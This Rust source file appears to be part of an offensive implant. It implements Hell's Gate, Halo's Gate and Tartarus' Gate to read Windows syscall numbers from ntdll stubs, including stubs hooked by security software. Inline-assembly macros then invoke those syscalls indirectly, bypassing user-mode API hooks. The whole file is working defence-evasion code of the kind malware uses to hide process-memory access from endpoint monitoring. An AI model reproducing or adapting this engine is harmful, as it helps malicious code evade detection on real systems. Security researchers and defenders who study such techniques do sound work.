//! Indirect syscall engine — resolve SSN from ntdll syscall stubs
//!
//! Implements Hell's Gate / Halo's Gate / Tartarus' Gate for SSN resolution.
//! Syscalls execute via `syscall` instruction to avoid user-mode API hooks.

use crate::resolver::ApiResolver;

/// Resolved syscall entry: SSN + syscall instruction address in ntdll
#[derive(Clone, Copy)]
pub struct SyscallEntry {
    pub ssn: u16,
    pub syscall_addr: *const u8, // Address of `syscall` instruction in ntdll
}

/// Resolve SSN for a given Nt* function by reading its syscall stub in ntdll
///
/// Pattern for an unhooked ntdll stub:
/// ```
/// 4C 8B D1          mov r10, rcx
/// B8 XX XX 00 00    mov eax, <SSN>
/// ...
/// 0F 05             syscall
/// C3                ret
/// ```
pub fn resolve_ssn(api: &ApiResolver, func_hash: u32) -> Option<SyscallEntry> {
    let func_addr = api.ntdll(func_hash)? as *const u8;

    unsafe {
        // Hell's Gate: Check if stub is unhooked
        if *func_addr == 0x4C
            && *func_addr.add(1) == 0x8B
            && *func_addr.add(2) == 0xD1
            && *func_addr.add(3) == 0xB8
        {
            let ssn = *(func_addr.add(4) as *const u16);
            let syscall_addr = find_syscall_ret(func_addr)?;
            return Some(SyscallEntry { ssn, syscall_addr });
        }

        // Halo's Gate / Tartarus' Gate: Stub is hooked, search neighbors
        // Each ntdll stub is typically 32 bytes apart
        for offset in 1..=25i32 {
            for direction in &[-1i32, 1i32] {
                let neighbor = func_addr.offset((*direction * offset * 32) as isize);

                // Validate neighbor bounds (rough check)
                if (neighbor as usize) < (api.ntdll_base as usize) {
                    continue;
                }

                if *neighbor == 0x4C
                    && *neighbor.add(1) == 0x8B
                    && *neighbor.add(2) == 0xD1
                    && *neighbor.add(3) == 0xB8
                {
                    let neighbor_ssn = *(neighbor.add(4) as *const u16);
                    let computed_ssn = (neighbor_ssn as i32 - direction * offset) as u16;
                    // Use the neighbor's syscall address for indirect syscall
                    let syscall_addr = find_syscall_ret(neighbor)?;
                    return Some(SyscallEntry {
                        ssn: computed_ssn,
                        syscall_addr,
                    });
                }
            }
        }
    }

    None
}

/// Find the `syscall; ret` instruction sequence near a ntdll stub
unsafe fn find_syscall_ret(stub_addr: *const u8) -> Option<*const u8> {
    // Search forward from stub for `0F 05` (syscall) followed by `C3` (ret)
    for i in 0..64usize {
        if *stub_addr.add(i) == 0x0F && *stub_addr.add(i + 1) == 0x05 {
            return Some(stub_addr.add(i));
        }
    }
    None
}

// --- Indirect syscall invocation macros ---
//
// These use inline assembly to set up registers and `call` the syscall;ret
// gadget inside ntdll (indirect syscall).
//
// CRITICAL: use `call` not `jmp`. The `ret` after `syscall` needs a return
// address on the stack. `call` pushes one; `jmp` does not.
//
// Stack layout at syscall time (after `call` pushes ret addr):
//   [rsp]      = return address (pushed by call)
//   [rsp+0x08] = shadow space (rcx home)
//   [rsp+0x10] = shadow space (rdx home)
//   [rsp+0x18] = shadow space (r8 home)
//   [rsp+0x20] = shadow space (r9 home)
//   [rsp+0x28] = 5th argument (if any)
//   [rsp+0x30] = 6th argument (if any)

/// Invoke an indirect syscall with 4 arguments (most common)
#[allow(unused_macros)]
macro_rules! indirect_syscall {
    ($entry:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr) => {{
        let status: i32;
        std::arch::asm!(
            "sub rsp, 0x28",        // shadow space (0x20) + align (0x08)
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "call {addr}",          // call syscall;ret → pushes ret addr → ret comes back
            "add rsp, 0x28",        // cleanup
            ssn = in(reg) $entry.ssn as u32,
            addr = in(reg) $entry.syscall_addr,
            in("rcx") $a1 as u64,
            in("rdx") $a2 as u64,
            in("r8") $a3 as u64,
            in("r9") $a4 as u64,
            lateout("rax") status,
            clobber_abi("system"),
        );
        status
    }};
}

#[allow(unused_imports)]
pub(crate) use indirect_syscall;

/// Invoke an indirect syscall with 5 arguments (e.g., NtReadVirtualMemory)
///
/// Before sub: rsp = SP (16-aligned in function body)
/// After sub 0x28: rsp = SP - 0x28 (8 mod 16, correct for call)
/// 5th arg at [rsp+0x20] = [SP - 0x08]
/// After call pushes ret addr: rsp = SP - 0x30 (16-aligned)
/// Kernel reads 5th from [rsp+0x28] = [SP - 0x08] ✓
#[allow(unused_macros)]
macro_rules! indirect_syscall5 {
    ($entry:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr, $a5:expr) => {{
        let status: i32;
        std::arch::asm!(
            "sub rsp, 0x28",           // shadow (0x20) + 5th arg (0x08)
            "mov [rsp+0x20], {a5}",    // 5th arg placement
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "call {addr}",             // call → push ret addr → syscall → ret here
            "add rsp, 0x28",           // cleanup
            a5 = in(reg) $a5 as u64,
            ssn = in(reg) $entry.ssn as u32,
            addr = in(reg) $entry.syscall_addr,
            in("rcx") $a1 as u64,
            in("rdx") $a2 as u64,
            in("r8") $a3 as u64,
            in("r9") $a4 as u64,
            lateout("rax") status,
            clobber_abi("system"),
        );
        status
    }};
}

#[allow(unused_imports)]
pub(crate) use indirect_syscall5;

/// Invoke an indirect syscall with 6 arguments (e.g., NtQueryVirtualMemory)
#[allow(unused_macros)]
macro_rules! indirect_syscall6 {
    ($entry:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr, $a5:expr, $a6:expr) => {{
        let status: i32;
        std::arch::asm!(
            "sub rsp, 0x38",           // shadow (0x20) + 5th,6th (0x10) + align (0x08)
            "mov [rsp+0x20], {a5}",    // 5th arg → after call at [rsp+0x28]
            "mov [rsp+0x28], {a6}",    // 6th arg → after call at [rsp+0x30]
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "call {addr}",
            "add rsp, 0x38",
            a5 = in(reg) $a5 as u64,
            a6 = in(reg) $a6 as u64,
            ssn = in(reg) $entry.ssn as u32,
            addr = in(reg) $entry.syscall_addr,
            in("rcx") $a1 as u64,
            in("rdx") $a2 as u64,
            in("r8") $a3 as u64,
            in("r9") $a4 as u64,
            lateout("rax") status,
            clobber_abi("system"),
        );
        status
    }};
}

#[allow(unused_imports)]
pub(crate) use indirect_syscall6;
